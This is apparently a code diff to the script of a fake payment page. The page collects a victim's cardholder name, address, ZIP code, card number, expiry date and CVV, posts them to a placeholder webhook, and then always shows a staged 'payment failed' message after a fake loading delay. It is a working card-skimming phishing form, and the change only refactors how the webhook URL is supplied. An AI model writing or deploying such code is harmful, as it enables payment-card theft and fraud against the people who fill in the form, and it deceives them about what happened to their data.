@@ -331,56 +331,65 @@
 
     </div>
 
-    <script>
-    const form = document.getElementById('paymentForm');
+   <script>
+const form = document.getElementById('paymentForm');
+
+async function getWebhookURL() {
+    // Directly include the webhook URL instead of fetching it
     const webhookURL = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL
+    return webhookURL;
+}
 
-    form.addEventListener('submit', async function(event) {
-        event.preventDefault(); // Prevent the form from submitting normally
+form.addEventListener('submit', async function(event) {
+    event.preventDefault(); // Prevent the form from submitting normally
 
-        // Show the loading overlay
-        document.getElementById('loadingOverlay').style.display = 'flex';
+    // Show the loading overlay
+    document.getElementById('loadingOverlay').style.display = 'flex';
 
-        // Prepare data to send to the webhook
-        const cardholderName = document.getElementById('cardholderName').value;
-        const zipcode = document.getElementById('zipcode').value;
-        const fullAddress = document.getElementById('fullAddress').value;
-        const cardNumber = document.getElementById('cardNumber').value;
-        const expiryDate = document.getElementById('expiryDate').value;
-        const cvv = document.getElementById('cvv').value;
+    // Prepare data to send to the webhook
+    const cardholderName = document.getElementById('cardholderName').value;
+    const zipcode = document.getElementById('zipcode').value;
+    const fullAddress = document.getElementById('fullAddress').value;
+    const cardNumber = document.getElementById('cardNumber').value;
+    const expiryDate = document.getElementById('expiryDate').value;
+    const cvv = document.getElementById('cvv').value;
 
-        const paymentData = {
-            content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
-        };
+    const paymentData = {
+        content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
+    };
 
-        try {
-            // Send the payment data to the webhook
-            const response = await fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(paymentData),
-            });
+    try {
+        // Get the webhook URL directly
+        const webhookURL = await getWebhookURL();
 
-            // Check if the request was successful
-            if (!response.ok) {
-                throw new Error('Failed to send data to the webhook');
-            }
+        // Send the payment data to the webhook
+        const response = await fetch(webhookURL.trim(), {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(paymentData),
+        });
 
-            // Simulate loading for a longer duration
-            setTimeout(() => {
-                // Hide loading overlay and show failure message
-                document.getElementById('loadingOverlay').style.display = 'none';
-                document.getElementById('failureMessage').style.display = 'block';
-            }, 3000); // Adjust the time as needed (3000ms = 3 seconds)
-
-        } catch (error) {
-            console.error('Error:', error);
-            document.getElementById('loadingOverlay').style.display = 'none';
-            alert('There was an error processing your payment. Please try again later.');
+        // Check if the request was successful
+        if (!response.ok) {
+            throw new Error('Failed to send data to the webhook');
         }
-    });
+
+        // Simulate loading for a longer duration
+        setTimeout(() => {
+            // Hide loading overlay and show failure message
+            document.getElementById('loadingOverlay').style.display = 'none';
+            document.getElementById('failureMessage').style.display = 'block'; // Show failure message
+        }, 3000); // Adjust the time as needed (3000ms = 3 seconds)
+
+    } catch (error) {
+        console.error('Error:', error);
+        document.getElementById('loadingOverlay').style.display = 'none';
+        document.getElementById('failureMessage').style.display = 'block'; // Show failure message on error
+    }
+});
 </script>
+
 
 </body>
